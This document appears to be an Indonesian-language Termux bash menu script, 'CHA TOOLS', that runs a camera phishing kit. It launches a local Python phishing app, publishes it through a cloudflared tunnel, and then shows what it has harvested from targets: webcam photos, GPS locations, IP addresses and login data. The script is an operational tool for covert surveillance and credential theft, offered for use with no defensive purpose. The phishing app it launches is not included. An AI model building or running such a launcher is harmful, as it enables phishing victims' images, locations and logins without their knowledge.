#!/data/data/com.termux/files/usr/bin/bash

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

clear

# Banner
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  ⚡ CHA TOOLS v1.0 ⚡${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${WHITE}  Author  : nzm${NC}"
echo -e "${WHITE}  Version : 1.0${NC}"
echo -e "${WHITE}  Status  : PREMIUM${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}[ MAIN MENU ]${NC}"
echo ""
echo -e "${GREEN}[01]${NC} CAMERA PHISH (WEBCAM + GPS)"
echo -e "${GREEN}[02]${NC} CEK HASIL (FOTO + IP + GPS)"
echo -e "${GREEN}[03]${NC} BUKA FOTO (TERMUX-VIEWER)"
echo -e "${GREEN}[04]${NC} COPY FOTO KE GALERI"
echo -e "${GREEN}[05]${NC} CEK IP TARGET"
echo -e "${GREEN}[06]${NC} HAPUS SEMUA HASIL"
echo -e "${GREEN}[00]${NC} KELUAR"
echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}📌 by nzm${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
read -p "➤ Pilih menu : " menu

case $menu in
    1)
        echo -e "${GREEN}▶ Menjalankan Camera Phish...${NC}"
        cd ~/camera-phishss/"ai mamb"
        python app.py &
        sleep 3
        cloudflared tunnel --url http://localhost:5000
        ;;
    2)
        echo -e "${GREEN}▶ CEK HASIL${NC}"
        cd ~/camera-phishss/"ai mamb"/captured
        echo ""
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        cat data.txt
        echo ""
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        ls images/
        echo ""
        read -p "Tekan Enter untuk kembali..."
        ./cha-tools.sh
        ;;
    3)
        echo -e "${GREEN}▶ BUKA FOTO${NC}"
        cd ~/camera-phishss/"ai mamb"/captured/images
        ls
        echo ""
        read -p "Masukkan nama file foto (contoh: 20260813_143000.jpg): " foto
        termux-open "$foto"
        read -p "Tekan Enter untuk kembali..."
        ./cha-tools.sh
        ;;
    4)
        echo -e "${GREEN}▶ COPY FOTO KE GALERI${NC}"
        cp ~/camera-phishss/"ai mamb"/captured/images/*.jpg /sdcard/DCIM/Camera/
        echo -e "${GREEN}✅ Foto berhasil disalin ke galeri!${NC}"
        read -p "Tekan Enter untuk kembali..."
        ./cha-tools.sh
        ;;
    5)
        echo -e "${GREEN}▶ CEK IP TARGET${NC}"
        cd ~/camera-phishss/"ai mamb"/captured
        echo ""
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${YELLOW}🌐 IP TARGET TERAKHIR${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        grep -oE 'IP     : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt | tail -1
        echo ""
        read -p "Tekan Enter untuk kembali..."
        ./cha-tools.sh
        ;;
    6)
        echo -e "${RED}▶ HAPUS SEMUA HASIL${NC}"
        rm -rf ~/camera-phishss/"ai mamb"/captured/*
        echo -e "${GREEN}✅ Semua hasil berhasil dihapus!${NC}"
        read -p "Tekan Enter untuk kembali..."
        ./cha-tools.sh
        ;;
    0)
        echo -e "${RED}Keluar...${NC}"
        exit
        ;;
    *)
        echo -e "${RED}❌ Pilihan salah!${NC}"
        sleep 1
        ./cha-tools.sh
        ;;
esac